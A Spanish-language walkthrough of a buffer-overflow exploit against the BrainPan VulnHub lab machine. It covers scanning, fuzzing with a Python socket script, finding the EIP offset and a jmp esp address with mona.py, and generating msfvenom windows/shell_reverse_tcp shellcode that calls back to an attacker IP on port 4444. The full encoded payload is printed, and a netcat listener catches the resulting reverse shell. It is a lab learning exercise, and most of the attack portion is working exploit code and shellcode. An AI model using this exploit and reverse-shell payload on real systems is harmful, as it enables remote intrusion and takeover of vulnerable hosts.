# Resolviendo máquina BrainPain de VulnHub
---
### Software:

- Immunity Debugger
- mona.py
- VMware
- Dirsearch
- python

### OS:

 - Windows 10 Pro
 - Kali Linux
 - MV BrainPain
 ---
 ### Empezamos:
 En primer lugar, levantaremos la máquina BrainPain y desde nuestra Kali haremos un escaneo de nuestra red para ver si la encontramos. Para ello lanzamos:
 ````
 nmap 192.168.0.0/24 -v -O
 ````
 Una vez la identificamos nos damos cuenta que tiene abiertos los puertos 9999 y el 10000 con el servicio HTTP activo, por lo que abriremos la dirección en el navegador web.
 
##### Instalación y uso de "Dirsearch"
 Al entrar en la dirección web encontramos una imagen y no hay enlaces ni posibilidad de movernos por la web, por lo que utilizaremos el siguiente programa: ***Dirsearch***
 ````
 https://github.com/maurosoria/dirsearch
 git clone https://github.com/maurosoria/dirsearch.git
 cd dirsearch
 python3 dirsearch.py -u <URL> -e <EXTENSIONS>
 ````
 Al ejecutar el programa, econtramos que tiene un directorio: "/bin". Al entrar nos encontramos con un .exe.
 Por lo que llega el momento de irnos a nuestra máquina Windows 10 pro.

Al ejecutar el programa nos encontramos con esto:
 ````
 [+] initializing winsock...done.
 [+] server socket created.
 [+] bind done on port 9999
 [+] waiting for connections.
 
 ````

Se crea un server socket en el puerto 9999. Es el momento de crear un script en python para ser capaces de enviarles bytes al servidor y ver si somos capaces de encontrar un BOF.

##### Creacion del script

El script nombrado "brainpain.py" es muy sencillo, simplemente genera una conexión y manda los bytes que le indiquemos:
````
#!/usr/bin/python
import socket

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(('xxx.xxx.xxx.xxx',9999))

buf = '\x41' * 1000

client.send(buf)
data = client.recv(len(buf))
client.close()
print data

````

#### Explotación del BoF
Al ejecutar el script le hemos enviado 1000 bytes al socket, la respuesta que recibimos nos deja caer que hemos sobreescrito la pila y por tanto hemos encontrado un BoF:
````
[+] received connection.
[get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA( _]
[get_reply] copied 1003 bytes to buffer
````
Para tomar el control de EIP, usaremos el Inmunity Debbuger y el script de mona.
Estos son los pasos que hemos seguido:

1. Utilizar !mona para crear una cadena de carácteres de 1000 bytes y ver donde rompe el programa.

````
!mona pattern_create 1000
````
2. Una vez hemos enviado la cadena de 1000 bytes creada anteriormente,  vamos a ver donde rompe para tomar el control de EIP.
````
!mona pattern_offset 35724134 <--- Esta es la dirección de EIP
````
El resultado nos dice que en la posición 524 de la cadena de bytes es donde se rompe la cadena. Por lo que ya sabemos donde tendremos que poner la dirección de retorno.

3. Ahora es el momento de encontrar los badchars para ir a una dirección de retorno que no falle y crear una shellcode que nos funcione. Para ello:
````!mona bytearray -cpb "\x00"````

Así es como quedaría el script con la cadena de los badchars:
````
#!/usr/bin/python
import socket

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(('192.168.1.129',9999))

buf = '\x41' * 524 #padding
buf += '\x42' * 4 #EIP 
buf += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
buf += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
buf += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
buf += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
buf += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
buf += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
buf += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
buf += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#badchars = 00 

client.send(buf)
data = client.recv(len(buf))
client.close()
print data
````

Para encontrar los badchars utilizaremos el siguiente comando:
````
!mona compare -f "Dirección donde esta el .bin" -a "Dirección de ESP"
!mona compare -f C:\logs\brainpan\bytearray.bin -a 005FF910
````
En este caso no hay ninguno por lo que no debemos de preocuparnos a la hora de generar la shellcode ni buscando la dirección de retorno.

4. Encontrar una dirección de retorno valida sin ASLR.
````
!mona jmp -r esp
Esta es la respuesta:   
0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Exploiting\Brainpain\brainpan.exe)
````
Por lo tanto sabemos que en la dirección 0x311712f3, tenemos una dirección de retorno válida para ejecutar nuestra shellcode.

5. El momento de ejecutar la shellcode, para ello en nuestra kali vamos a utilizar msfvenom para crearla con el siguiente comando:
````
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=192.168.1.136 LPORT=4444 -v buf  -f python

ound 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 708 (iteration=0)
x86/alpha_mixed chosen with final size 708
Payload size: 708 bytes
Final size of python file: 3448 bytes
buf =  b""
buf += b"\xda\xda\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51"
buf += b"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
buf += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
buf += b"\x38\x41\x42\x75\x4a\x49\x49\x6c\x7a\x48\x4e\x62\x43"
buf += b"\x30\x67\x70\x57\x70\x65\x30\x4f\x79\x7a\x45\x66\x51"
buf += b"\x59\x50\x75\x34\x4e\x6b\x42\x70\x76\x50\x4c\x4b\x70"
buf += b"\x52\x46\x6c\x4c\x4b\x52\x72\x45\x44\x4e\x6b\x61\x62"
buf += b"\x36\x48\x36\x6f\x4e\x57\x71\x5a\x66\x46\x46\x51\x6b"
buf += b"\x4f\x6e\x4c\x35\x6c\x43\x51\x43\x4c\x67\x72\x44\x6c"
buf += b"\x47\x50\x39\x51\x38\x4f\x36\x6d\x46\x61\x5a\x67\x48"
buf += b"\x62\x48\x72\x72\x72\x33\x67\x6e\x6b\x52\x72\x66\x70"
buf += b"\x4c\x4b\x30\x4a\x45\x6c\x4c\x4b\x50\x4c\x57\x61\x74"
buf += b"\x38\x58\x63\x32\x68\x77\x71\x7a\x71\x33\x61\x6c\x4b"
buf += b"\x43\x69\x67\x50\x67\x71\x38\x53\x6c\x4b\x62\x69\x36"
buf += b"\x78\x49\x73\x74\x7a\x31\x59\x4c\x4b\x67\x44\x4e\x6b"
buf += b"\x57\x71\x38\x56\x34\x71\x59\x6f\x4e\x4c\x69\x51\x7a"
buf += b"\x6f\x46\x6d\x53\x31\x6b\x77\x70\x38\x49\x70\x53\x45"
buf += b"\x79\x66\x46\x63\x73\x4d\x4a\x58\x45\x6b\x73\x4d\x31"
buf += b"\x34\x63\x45\x68\x64\x61\x48\x4c\x4b\x70\x58\x64\x64"
buf += b"\x36\x61\x68\x53\x51\x76\x6e\x6b\x74\x4c\x30\x4b\x6c"
buf += b"\x4b\x31\x48\x47\x6c\x46\x61\x69\x43\x6e\x6b\x66\x64"
buf += b"\x4e\x6b\x53\x31\x5a\x70\x6b\x39\x43\x74\x44\x64\x35"
buf += b"\x74\x43\x6b\x51\x4b\x31\x71\x53\x69\x61\x4a\x62\x71"
buf += b"\x69\x6f\x39\x70\x71\x4f\x43\x6f\x73\x6a\x4e\x6b\x55"
buf += b"\x42\x48\x6b\x6e\x6d\x63\x6d\x62\x48\x76\x53\x35\x62"
buf += b"\x63\x30\x53\x30\x43\x58\x64\x37\x50\x73\x50\x32\x31"
buf += b"\x4f\x61\x44\x43\x58\x50\x4c\x53\x47\x46\x46\x63\x37"
buf += b"\x79\x6f\x68\x55\x6c\x78\x7a\x30\x73\x31\x43\x30\x37"
buf += b"\x70\x64\x69\x6f\x34\x51\x44\x32\x70\x73\x58\x36\x49"
buf += b"\x4d\x50\x70\x6b\x43\x30\x6b\x4f\x38\x55\x30\x50\x36"
buf += b"\x30\x52\x70\x76\x30\x43\x70\x36\x30\x71\x50\x32\x70"
buf += b"\x61\x78\x69\x7a\x36\x6f\x59\x4f\x4d\x30\x49\x6f\x6a"
buf += b"\x75\x6e\x77\x62\x4a\x43\x35\x65\x38\x39\x50\x39\x38"
buf += b"\x36\x61\x4b\x38\x73\x58\x34\x42\x77\x70\x54\x51\x53"
buf += b"\x6c\x4c\x49\x39\x76\x31\x7a\x72\x30\x61\x46\x53\x67"
buf += b"\x50\x68\x4c\x59\x4c\x65\x51\x64\x63\x51\x4b\x4f\x4b"
buf += b"\x65\x4c\x45\x49\x50\x51\x64\x46\x6c\x6b\x4f\x62\x6e"
buf += b"\x44\x48\x42\x55\x58\x6c\x65\x38\x6c\x30\x4d\x65\x59"
buf += b"\x32\x63\x66\x4b\x4f\x69\x45\x72\x48\x65\x33\x72\x4d"
buf += b"\x30\x64\x75\x50\x4d\x59\x4a\x43\x32\x77\x46\x37\x46"
buf += b"\x37\x64\x71\x5a\x56\x33\x5a\x67\x62\x50\x59\x53\x66"
buf += b"\x59\x72\x59\x6d\x63\x56\x69\x57\x77\x34\x36\x44\x35"
buf += b"\x6c\x45\x51\x35\x51\x4c\x4d\x37\x34\x77\x54\x46\x70"
buf += b"\x7a\x66\x47\x70\x67\x34\x53\x64\x50\x50\x76\x36\x43"
buf += b"\x66\x31\x46\x70\x46\x71\x46\x70\x4e\x52\x76\x76\x36"
buf += b"\x70\x53\x31\x46\x53\x58\x33\x49\x5a\x6c\x65\x6f\x6b"
buf += b"\x36\x59\x6f\x6a\x75\x6f\x79\x59\x70\x42\x6e\x32\x76"
buf += b"\x42\x66\x79\x6f\x50\x30\x55\x38\x34\x48\x4e\x67\x35"
buf += b"\x4d\x65\x30\x39\x6f\x39\x45\x6d\x6b\x6c\x30\x6e\x55"
buf += b"\x4e\x42\x46\x36\x53\x58\x4e\x46\x4f\x65\x6d\x6d\x6d"
buf += b"\x4d\x39\x6f\x49\x45\x35\x6c\x74\x46\x31\x6c\x37\x7a"
buf += b"\x6d\x50\x49\x6b\x6d\x30\x70\x75\x76\x65\x4f\x4b\x51"
buf += b"\x57\x34\x53\x74\x32\x30\x6f\x70\x6a\x63\x30\x42\x73"
buf += b"\x4b\x4f\x79\x45\x41\x41"
````
6. Lo pegamos en nuestro script, creamos un listener en nuestro kali ```` nc -lvp 4444```` y ejecutamos el script.

7. De esta forma obtenemos una reverse shell y hemos conseguido la explotación del BoF. Ahora quedaría la parte de la escalada de privilegios en la MV. Lo dejaremos para una segunda parte.

**Espero que os haya gustado**
**Hasta la próxima**
